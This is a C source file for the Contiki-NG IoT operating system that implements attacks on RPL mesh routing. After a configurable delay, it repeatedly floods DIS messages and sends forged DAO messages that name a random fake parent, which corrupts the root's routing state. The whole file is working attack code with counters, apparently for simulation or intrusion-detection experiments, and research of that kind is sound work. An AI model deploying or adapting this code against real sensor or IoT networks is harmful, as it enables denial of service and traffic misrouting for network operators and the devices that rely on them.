#include "contiki.h"
#include "net/ipv6/uip.h"
#include "net/ipv6/uip-icmp6.h"
#include "net/routing/rpl-lite/rpl.h"
#include "sys/node-id.h"
#include "lib/random.h"
#include "attack.h"
#include <string.h>

#ifndef ATTACK_START_SEC
#define ATTACK_START_SEC 300
#endif
#ifndef ATTACK_DIS_INTERVAL
#define ATTACK_DIS_INTERVAL 3
#endif
#ifndef ATTACK_DAO_INTERVAL
#define ATTACK_DAO_INTERVAL 2
#endif
#ifndef NUM_NODES
#define NUM_NODES 30
#endif

uint32_t attack_dis_sent;
uint32_t attack_dao_sent;

PROCESS(attack_process, "attack");

static void
forged_dao(void)
{
  unsigned char *b = UIP_ICMP_PAYLOAD;
  const uip_ipaddr_t *me = rpl_get_global_address();
  uip_ipaddr_t *real;
  uint8_t fake;
  int pos = 0;

  if(!curr_instance.used || curr_instance.dag.preferred_parent == NULL ||
     me == NULL) {
    return;
  }
  real = rpl_neighbor_get_ipaddr(curr_instance.dag.preferred_parent);
  if(real == NULL) {
    return;
  }
  do {
    fake = 1 + random_rand() % NUM_NODES;
  } while(fake == node_id || fake == real->u8[15]);

  b[pos++] = curr_instance.instance_id;
  b[pos++] = 0;
  b[pos++] = 0;
  b[pos++] = curr_instance.dag.dao_last_seqno;

  b[pos++] = RPL_OPTION_TARGET;
  b[pos++] = 18;
  b[pos++] = 0;
  b[pos++] = 128;
  memcpy(b + pos, me, 16);
  pos += 16;

  b[pos++] = RPL_OPTION_TRANSIT;
  b[pos++] = 20;
  b[pos++] = 0;
  b[pos++] = 0;
  b[pos++] = 0;
  b[pos++] = curr_instance.default_lifetime;
  memcpy(b + pos, &curr_instance.dag.dag_id, 8);
  pos += 8;
  b[pos++] = 0x02;
  b[pos++] = fake;
  b[pos++] = 0;
  b[pos++] = fake;
  b[pos++] = 0;
  b[pos++] = fake;
  b[pos++] = 0;
  b[pos++] = fake;

  uip_icmp6_send(&curr_instance.dag.dag_id, ICMP6_RPL, RPL_CODE_DAO, pos);
  attack_dao_sent++;
}

PROCESS_THREAD(attack_process, ev, data)
{
  static struct etimer start;
  static struct etimer dis_timer;
  static struct etimer dao_timer;

  PROCESS_BEGIN();

  etimer_set(&start, ATTACK_START_SEC * CLOCK_SECOND);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&start));

  if(ATTACK_MODE & ATK_DIS) {
    etimer_set(&dis_timer, ATTACK_DIS_INTERVAL * CLOCK_SECOND);
  }
  if(ATTACK_MODE & ATK_DAO) {
    etimer_set(&dao_timer, ATTACK_DAO_INTERVAL * CLOCK_SECOND);
  }

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(ev == PROCESS_EVENT_TIMER);
    if((ATTACK_MODE & ATK_DIS) && data == &dis_timer) {
      rpl_icmp6_dis_output(NULL);
      attack_dis_sent++;
      etimer_reset(&dis_timer);
    }
    if((ATTACK_MODE & ATK_DAO) && data == &dao_timer) {
      forged_dao();
      etimer_reset(&dao_timer);
    }
  }

  PROCESS_END();
}

void
attack_start(void)
{
#if ATTACK_MODE != ATK_NONE
  process_start(&attack_process, NULL);
#endif
}
